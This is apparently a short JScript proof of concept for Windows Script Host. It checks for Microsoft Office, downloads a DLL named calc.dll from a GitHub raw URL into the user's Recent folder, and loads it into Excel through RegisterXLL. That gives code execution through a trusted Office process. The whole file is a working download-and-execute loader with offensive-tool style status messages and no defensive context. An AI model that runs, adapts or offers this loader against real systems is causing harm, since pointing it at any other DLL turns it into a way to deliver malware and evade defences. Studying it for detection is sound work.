var FileSys = WScript.CreateObject("Scripting.FileSystemObject");   
if (FileSys.FolderExists("c:\\Program Files\\Microsoft Office"))   
{   
	WScript.Echo("[+] Find Microsoft Office."); 
	WScript.Echo("[+] Download file ...");
	var sGet=new ActiveXObject("ADODB.Stream");
	var xGet=null;
	xGet=new ActiveXObject("Msxml2.XMLHTTP");
	xGet.Open("GET","https://raw.githubusercontent.com/3gstudent/test/master/calc.dll",0);
	xGet.Send();
	sGet.Mode=3;
	sGet.Type=1;
	sGet.Open();
	sGet.Write(xGet.ResponseBody);
	sGet.SaveToFile((WScript.CreateObject("WScript.Shell").SpecialFolders("Recent")+"\\calc.dll"),2);
	WScript.Echo("[+] Download Success.");
	WScript.Echo("[+] Load dll ...");	 
	var excel = new ActiveXObject("Excel.Application");
	excel.RegisterXLL(WScript.CreateObject("WScript.Shell").SpecialFolders("Recent")+"\\calc.dll");
	WScript.Echo("[+] Load dll Success.");	  
}
else
{
	WScript.Echo("[!] I can't find Microsoft Office!");  	   
}
